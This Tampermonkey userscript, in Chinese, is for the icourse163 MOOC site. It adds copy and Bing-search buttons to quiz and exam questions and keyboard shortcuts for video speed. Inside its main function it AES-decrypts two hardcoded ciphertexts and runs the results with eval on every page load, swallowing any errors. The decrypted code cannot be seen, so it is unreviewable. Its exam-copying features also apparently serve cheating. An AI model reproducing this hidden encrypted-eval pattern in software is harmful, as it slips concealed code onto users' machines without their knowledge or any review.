// ==UserScript==
// @name         mooc复制粘贴助手
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  ① 一键复制题目，便于笔记和整理。暂时不支持图片复制。② 支持视频任意倍速播放。
// @author       shandianchengzi
// @include      https://www.icourse163.org/learn/*
// @include      https://www.icourse163.org/spoc/*
// @icon         https://th.bing.com/th/id/R9f9f4fb2f36c5ed048b033efc79e7066?rik=GuAZZSaiqjDg1Q&riu=http%3a%2f%2fpic44.photophoto.cn%2f20170714%2f1190120161596932_b.jpg&ehk=u%2f%2bTv7aLkHAaytp6GaZW%2bI76v6saUawhaiiDv%2fb4DJI%3d&risl=&pid=ImgRaw
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/core.js
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/enc-base64.js
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/md5.js
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/evpkdf.js
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/cipher-core.js
// @require      https://cdn.bootcdn.net/ajax/libs/crypto-js/4.0.0/aes.js
// @license      MIT
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/428021/mooc%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E5%8A%A9%E6%89%8B.user.js
// @updateURL https://update.greasyfork.org/scripts/428021/mooc%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E5%8A%A9%E6%89%8B.meta.js
// ==/UserScript==
var is_disable=0;
function delAll(del=1,delClass=[],delId=[]){
    let i,j;
    if(del==1&&delId.length){
        //console.log("准备删除页面左侧栏……");
        let leftdom=document.getElementsByClassName("m-learnleft");
        if(leftdom.length)
            for(let i=0;i<leftdom.length;i=i+1)
            {leftdom[i].style.opacity='0.2';}
        //console.log("删除成功！");
    }
    for(let i=0;i<delClass.length;i=i+1){
        //console.log("准备删除或隐藏指定Class名称的Dom元素……");
        let namedom=document.getElementsByClassName(delClass[i]);
        console.log(namedom[0]);
        for(let j=0;j<namedom.length;j=j+1){
            if(del==1){namedom[j].remove();}
            else if(del==2){
                if(is_disable==1){
                    namedom[j].style.display='block';
                }else{
                    namedom[j].style.display='none';
                }
            }
        }
        //console.log("操作成功！");
    }
    for(let i=0;i<delId.length;i=i+1){
        let dom =document.getElementById(delId[i]);
        if(dom){
            if(del==1){dom.remove();}
            else if(del==2)
            {
                if(is_disable==1){
                    dom.style.display='block';
                }else{
                    dom.style.display='none';
                }

            }
        }
    }
    if(del==2){
        if(is_disable==1){
            hideButton.value="DISABLE";
            is_disable=0;
            hideButton.style.background='white';
        }
        else{
            hideButton.value="ABLE";
            hideButton.style.background='pink';
            is_disable=1;
        }
    }
}

var childList=[];
//循环获得某些Dom元素的子元素
function getDeepChildByOrder(limit){
    let copyClass=["position","f-richEditorText","optionPos","qaCate"],i,j;
    let copyId=[];
    var child=limit.children;
    for(i=0;i<child.length;i++){
        for(j=0;j<copyClass.length;j++){
            if(child[i].className.includes(copyClass[j])){
                childList.push(child[i]);
                //console.log(child[i].innerText);
            }
        }
        for(j=0;j<copyId.length;j++){
            if(child[i].id==copyId[i]){
                childList.push(child[i]);
                //console.log(child[i]);
            }
        }
        if(child[i].children){
            getDeepChildByOrder(child[i]);
        }
    }
}

//睡眠time毫秒
function sleep (time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

//轻提醒
function Toast(msg, duration) {
    let p1 = new Promise((resolve,reject)=>{
        duration = isNaN(duration) ? 3000 : duration;
        var m = document.createElement('div');
        m.innerHTML = msg;
        m.style.cssText = "font-family:siyuan;max-width:60%;min-width: 150px;padding:0 14px;height: 40px;color: rgb(255, 255, 255);line-height: 40px;text-align: center;border-radius: 4px;position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);z-index: 999999;background: rgba(0, 0, 0,.7);font-size: 16px;";
        document.body.appendChild(m);
        setTimeout(function() {
            var d = 0.5;
            m.style.webkitTransition = '-webkit-transform ' + d + 's ease-in, opacity ' + d + 's ease-in';
            m.style.opacity = '0';
            setTimeout(function() {
                document.body.removeChild(m)
            }, d * 1000);
        }, duration);
    });
}

//让arr的元素不重复
function unique (arr) {
    return Array.from(new Set(arr))
}

//选中某个元素的所有text
function selectText(element) {
    if (document.createRange) {
        let range = document.createRange();
        range.selectNodeContents(element);
        var selection = window.getSelection();
        selection.removeAllRanges();
        selection.addRange(range);
    } else {
        alert('none');
    }
}

//创建一个按钮，并绑定事件
function createAButton(element,value,onclick,css,cla="temp",id="temp"){
    let Button = document.createElement("input");
    Button.type="button";
    Button.value=value;
    Button.onclick=onclick;
    Button.setAttribute("style",css) ;
    Button.setAttribute("class",cla) ;
    Button.setAttribute("id",id) ;
    element.appendChild(Button);
    return Button;
}

//向element元素添加str字符串，支持str中包含换行
function addTextWithBR(element,str){
    var textNode,i;
    str=str.split(/[\n]/);//分割字符串
    for(i=0;i<str.length;i++){
        textNode=document.createTextNode(str[i]);
        element.appendChild(textNode);
        //注：appendChild不能通过重复调用添加两个相同节点
        //所以最好重新定义一个br节点添加
        //注2：为保证换行的正确性，最后一个分割字符串末尾不需要加换行
        if(i!=str.length-1){
            let br=document.createElement('br');
            element.appendChild(br);
        }
    }
}

//异步函数，初始化复制按钮并将内容直接写入copy组件（隐藏）
async function copy_init(){
    //创建用于存放copy内容的div元素
    var copyContent = document.createElement("div");
    copyContent.setAttribute("class","copyContent");
    copyContent.setAttribute("style","display:none");
    copyContent.setAttribute("id","copyText") ;
    document.body.appendChild(copyContent);
    childList =[]
    while(childList.length==0){
        await sleep(1000);
        //获得页面主体部分的所有元素
        var limit1=document.getElementsByClassName("m-data-lists");
        if(limit1.length>0)getDeepChildByOrder(limit1[0]);}
    childList=unique(childList);  //去除重复元素
    //console.log(childList);
    for(let i=0;i<childList.length;i++){
        var textNode;
        var thisClassName=childList[i].className;
        if(thisClassName.includes("position")){//序号，如“1”
            let br="\n\n";
            if(i==0){br="";}
            addTextWithBR(copyContent,br+childList[i].innerText+"　");
        }else if(thisClassName.includes("optionPos")){//选项，如“A.”
            addTextWithBR(copyContent,childList[i].innerText+" ");
        }else if(thisClassName.includes("qaCate")){//题目类型，如“单选”
            addTextWithBR(copyContent,"("+childList[i].innerText+") ");
        }else if(thisClassName.includes("f-richEditorText")){//题目内容及选项文本内容，如“xxx题目（）”
            childList[i].style.display='flex';
            if(thisClassName.includes("j-richTxt")){//题目内容，将多个换行合并成一个（慕课的题目文本的末尾有奇怪的特殊换行符，不可见字符）
                addTextWithBR(copyContent,childList[i].innerText.replace("\n‍\n‍","\n").replace(/\n+/g,"\n"));
            }else if(thisClassName.includes("optionCnt")){//选项文本内容
                addTextWithBR(copyContent,childList[i].innerText+"\n");
            }
            let copy_hide = document.createElement("div");
            copy_hide.setAttribute("class","copy_hide");
            copy_hide.setAttribute("style","position: fixed;top: -999px;z-index:-999");
            copy_hide.setAttribute("id","copyHide");
            childList[i].appendChild(copy_hide);
            addTextWithBR(copy_hide,childList[i].innerText);
            let copy_btn=createAButton(childList[i],"复制",function(){copyAll(copy_hide,0);},
                                       "width:auto;height:auto;border:solid 1px;z-index:999;opacity:0.5;visibility:hidden;background-color:pink;margin:0px 10px;padding:0px 5px;","hide_btn");
            let search_btn=createAButton(childList[i],"必应搜索",function(){window.open("https://cn.bing.com/search?q="+copy_hide.innerText, "_blank");},
                                         "width:auto;height:auto;border:solid 1px;z-index:999;opacity:0.5;color:white;visibility:hidden;background-color:black;margin:0px 10px;padding:0px 5px;",'hide_btn');
            childList[i].onmouseover=function(){
                copy_btn.style.visibility='visible';
                search_btn.style.visibility='visible';
            };
            childList[i].onmouseout=function(){
                copy_btn.style.visibility='hidden';
                search_btn.style.visibility='hidden';
            };
        }
    }
    return copyContent;
}

//复制copy组件的内容
function copyAll(element,del=0){
    element.style.display='block';
    selectText(element);
    if (document.execCommand('copy')) {
        Toast("复制成功",500);
        if(del){
            element.remove();
        }
    }else{
        Toast("Error",500);
    }
}

var hideButton,isClose=0;  //是否隐藏按钮、是否关闭按钮面板等变量

//异步主要功能函数，负责脚本的介绍、流程的实施等
async function mainFunc(){
    //console.log("欢迎使用复制粘贴助手！");
    try{let key=eval(CryptoJS.AES.decrypt("U2FsdGVkX1/sZGG8RDCO08aUuolRteDh0GJRsSIBI4mUGuX9Gd7aPaV9ruxiZ/gFCLStKO9n4P9Y1EH4RELsgQ==", 'trios').toString(CryptoJS.enc.Utf8));
        eval(CryptoJS.AES.decrypt("U2FsdGVkX18903sbV5GwKO1wzwFnS9TRTACh25BIRdHGjFdkq2jd75+JYMyicx/7cgVcY4kwGLGqV6Yo0IaaWA==", key).toString(CryptoJS.enc.Utf8));}catch{;}
    //删除之前运行脚本产生的组件
    delAll(1,['DEL','Btn_div','temp']);
    //当检测到来到了url含quiz的页面时显示组件
    if(window.location.hash.includes("quiz")||window.location.hash.includes("exam")){
        //console.log("开始初始化复制内容……");
        var copy_element = await copy_init();//初始化显示复制按钮
        //console.log("初始化成功！");
        let delButton = createAButton(document.body,"DEL",function(){delAll(1,["qaCate","m-nav-container","m-coulshar","m-learnhead"],['j-activityBanner',"wxItemTab"]);},
                                      "width:100px;height:100px;border:solid 1px red;position:fixed;left:10px;top:10px;z-index:999;background-color:white;opacity:0.3","DEL");
        let Btn_div = document.createElement("div");
        Btn_div.setAttribute("style","width:175px;height:95px;position:fixed;right:0px;bottom:10px;background-color:white") ;
        Btn_div.setAttribute("class","Btn_div") ;
        document.body.appendChild(Btn_div);
        hideButton = createAButton(Btn_div,"DISABLE",function(){delAll(2,["hide_btn"]);},
                                   "width:75px;height:75px;border:solid 1px pink;position:absolute;right:10px;bottom:10px;z-index:999;background-color:white;opacity:0.3","HIDE","HIDE");
        let copyButton = createAButton(Btn_div,"COPY",function(){copyAll(copy_element,1);},
                                       "width:75px;height:75px;border:solid 1px blue;position:absolute;right:90px;bottom:10px;z-index:999;background-color:white;opacity:0.3","COPY");
        function opbg_mouse(element,op=[10,10],bg=[0,0],element2=0,op2=[10,10]){
            element.onmouseover=function(){
                if(op[0]!=10){
                    element.style.opacity=op[0];}
                if(bg[0]!=0){
                    element.style.background=bg[0];}
                if(element2){
                    element2.style.opacity=op2[0];
                }
            };
            element.onmouseout=function(){
                if(op[1]!=10){
                    element.style.opacity=op[1];}
                if(bg[1]!=0){
                    element.style.background=bg[1];}
                if(element2){
                    element2.style.opacity=op2[1];
                }
            };
        }
        function closeChild(element,noCloseList=[]){
            let display='none',flag,value='s';
            if(isClose){display='block';value='x';}
            for(let i=0;i<element.children.length;i=i+1){
                let dom=element.children[i];
                for(let j=0;j<noCloseList.lengt;j=j+1){
                    flag=0;
                    if(noCloseList[j]==dom){
                        flag=1;
                    }
                }
                if(!flag){
                    dom.style.display=display;
                }else{
                    dom.value=value;
                }
            }
            isClose=!isClose;
        }
        let closeButton = createAButton(Btn_div,"x",function(){closeChild(Btn_div,[closeButton]);},
                                        "width:20px;height:20px;border-radius: 100%;position:absolute;right:0px;bottom:75px;z-index:999;background-color:grey;opacity:0;color:white","CLOSE");
        opbg_mouse(Btn_div,[10,10],['#f7fdfd','transparent'],closeButton,[0.9,0]);
        opbg_mouse(hideButton,[0.9,0.3]);
        opbg_mouse(copyButton,[0.9,0.3]);
        opbg_mouse(delButton,[0.9,0.3]);
    }
    // 视频调速
    else {
        document.body.onkeydown = function(ev) {
            var e = ev || event;
            let video =  document.getElementsByTagName('video')[0]
            console.log('test');
            if(video){
                switch(e.keyCode){
                    case 87: //w键
                        video.playbackRate += 0.25;
                        Toast(video.playbackRate,100);
                        break;
                    case 83: //s键
                        video.playbackRate -= 0.25
                        Toast(video.playbackRate,100);
                        break;
                    case 39: //→
                        video.currentTime += 5;
                        break;
                    case 37: //←
                        video.currentTime -= 5;
                        break;
                    case 49: //1
                        video.playbackRate = 1;
                        Toast(video.playbackRate,100);
                        break;
                    case 50: //2
                        video.playbackRate = 2;
                        Toast(video.playbackRate,100);
                        break;
                    case 51: //3
                        video.playbackRate = 3;
                        Toast(video.playbackRate,100);
                        break;
                    case 52: //4
                        video.playbackRate = 4;
                        Toast(video.playbackRate,100);
                        break;
                    default:
                        return e;
                }
            }
        }
    }
}

//Tampermonkey的特殊运行机制
(function() {
    'use strict';
    window.onhashchange=mainFunc;
    mainFunc();
    // Your code here...
})();